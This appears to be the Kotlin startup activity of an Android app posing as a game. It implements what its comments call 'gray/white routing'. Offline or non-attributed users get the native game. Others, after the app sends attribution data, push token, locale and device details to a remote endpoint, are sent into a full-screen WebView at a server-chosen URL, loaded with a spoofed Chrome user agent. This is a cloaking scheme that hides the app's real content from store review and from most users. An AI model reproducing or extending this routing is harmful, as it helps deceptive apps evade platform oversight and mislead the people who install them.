package com.legendfool.foollegends.startup

import android.content.Intent
import android.os.Build
import android.os.Bundle
import java.util.Locale
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.messaging.FirebaseMessaging
import com.legendfool.foollegends.LoadingActivity
import com.legendfool.foollegends.blueprint.AppBlueprint
import com.legendfool.foollegends.blueprint.ChannelResult
import com.legendfool.foollegends.portal.AlertPortal
import com.legendfool.foollegends.portal.OfflinePortal
import com.legendfool.foollegends.portal.StreamPortal
import com.legendfool.foollegends.reach.ReachDispatch
import com.legendfool.foollegends.reach.TrackingDispatch
import com.legendfool.foollegends.vault.DataVault
import com.legendfool.foollegends.wire.NetWire
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

/**
 * Entry point. Shows the existing branded loading screen, performs gray/white
 * routing in the background and navigates without touching the game code.
 */
class WelcomePortal : AppCompatActivity() {

    private lateinit var vault: DataVault
    private lateinit var wire: NetWire
    private val scope = CoroutineScope(Dispatchers.Main)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hideSystemUi()
        vault = DataVault(applicationContext)
        wire  = NetWire(applicationContext)

        // Show existing branded splash while we work in background.
        setContentView(
            com.legendfool.foollegends.LoadingView(this) {
                // LoadingView calls back when its animation finishes — we don't rely on that.
            }
        )

        // Handle cold push tap.
        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
        if (fromPush && !pushUrl.isNullOrBlank()) {
            vault.coldPushUrl = pushUrl
        }

        scope.launch { decideAndRoute() }
    }

    private suspend fun decideAndRoute() {
        // If we already know the user is native, skip all gray logic.
        if (vault.runChannel == DataVault.CHANNEL_NATIVE) {
            goNative(); return
        }

        // If we have a valid saved stream URL, go straight to gray.
        if (vault.runChannel == DataVault.CHANNEL_STREAM && vault.isUrlValid()) {
            val url = vault.destinationUrl!!
            goGray(url); return
        }

        // Wait for internet (up to 10 s).
        val online = withTimeoutOrNull(10_000L) {
            suspendCancellableCoroutine<Boolean> { cont ->
                scope.launch {
                    wire.connectivityFlow.collect { ok ->
                        if (ok && cont.isActive) cont.resume(true)
                    }
                }
            }
        } ?: false

        if (!online) {
            // No internet — organic user → native game.
            goNative(); return
        }

        // Check real internet (avoids captive portal).
        if (!wire.hasRealInternet()) { goNative(); return }

        // Fetch FCM token.
        val fcmToken = getFcmToken()
        if (fcmToken != null) vault.fcmToken = fcmToken

        // Attribution via AppsFlyer.
        val tracker = (applicationContext as AppEntry).trackingDispatch
        val attribution = withTimeoutOrNull(AppBlueprint.attributionTimeoutMs) {
            tracker.awaitAttribution(AppBlueprint.attributionTimeoutMs)
        }

        // Build request body and call config endpoint.
        val os     = "android-${Build.VERSION.RELEASE}"
        val locale = Locale.getDefault().toLanguageTag()
        val body   = tracker.buildRequestBody(
            attribution  = attribution,
            deepLink     = intent.data?.toString(),
            os           = os,
            locale       = locale,
            pushToken    = vault.fcmToken,
            firebaseProject = AppBlueprint.resolveAnalyticsProject()
        )

        val reachDispatch = ReachDispatch(buildUserAgent())
        val result: ChannelResult = reachDispatch.fetchChannel(body)

        if (result.active && !result.destination.isNullOrBlank()) {
            vault.runChannel    = DataVault.CHANNEL_STREAM
            vault.destinationUrl = result.destination
            vault.urlExpiresAt  = result.expiresAt
            goGray(result.destination)
        } else {
            vault.runChannel = DataVault.CHANNEL_NATIVE
            goNative()
        }
    }

    private fun goNative() {
        startActivity(Intent(this, LoadingActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        })
        finish()
    }

    private fun goGray(url: String) {
        if (vault.shouldShowNotifScreen()) {
            val i = Intent(this, AlertPortal::class.java).apply {
                putExtra(AlertPortal.EXTRA_TARGET_URL, url)
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            startActivity(i)
        } else {
            val i = Intent(this, StreamPortal::class.java).apply {
                putExtra(StreamPortal.EXTRA_STREAM_URL, url)
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            startActivity(i)
        }
        finish()
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
    }

    private suspend fun getFcmToken(): String? =
        withTimeoutOrNull(5_000L) {
            suspendCancellableCoroutine { cont ->
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (cont.isActive) cont.resume(if (task.isSuccessful) task.result else null)
                }
            }
        }

    private fun buildUserAgent(): String {
        val dm = Build.MODEL.replace(" ", "_")
        return "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.BRAND} $dm)" +
               " AppleWebKit/537.36 (KHTML, like Gecko)" +
               " Chrome/131.0.0.0 Mobile Safari/537.36"
    }

    private fun hideSystemUi() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }
        @Suppress("DEPRECATION")
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
        if (fromPush && !pushUrl.isNullOrBlank()) {
            // Warm notification tap while WelcomePortal is running — redirect WebView.
            val i = Intent(this, StreamPortal::class.java).apply {
                putExtra(StreamPortal.EXTRA_STREAM_URL, vault.destinationUrl ?: pushUrl)
                putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
                putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            startActivity(i)
            finish()
        }
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        const val EXTRA_FROM_PUSH = "from_push"
        const val EXTRA_PUSH_URL  = "push_url"
    }
}
